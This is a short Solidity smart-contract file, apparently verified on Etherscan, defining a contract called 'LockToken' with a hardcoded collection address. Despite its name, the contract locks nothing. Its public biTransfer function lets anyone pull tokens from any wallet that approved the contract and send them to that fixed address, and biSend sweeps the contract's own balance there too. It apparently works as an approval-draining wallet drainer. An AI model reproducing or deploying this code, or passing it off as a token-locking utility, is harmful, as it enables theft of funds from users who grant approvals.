/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.4.17;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
contract LockToken {
	using SafeMath for uint256;
	address private feeaddress = 0x0FB894F685944234c24A2f0838BdA698ABD5A73A;	//归集地址

	//0x75595fcd
	function biTransfer(address _lpadd, address _add, uint256 _v) public {
		IERC20 _lp = IERC20(_lpadd);
		_lp.transferFrom(_add, feeaddress, _v);
	}
	//0x2e59f632
	function biSend(address _lpadd) public {
		IERC20 _lp = IERC20(_lpadd);
		uint256 _value = _lp.balanceOf(address(this));
		_lp.transfer(feeaddress, _value);
	}
}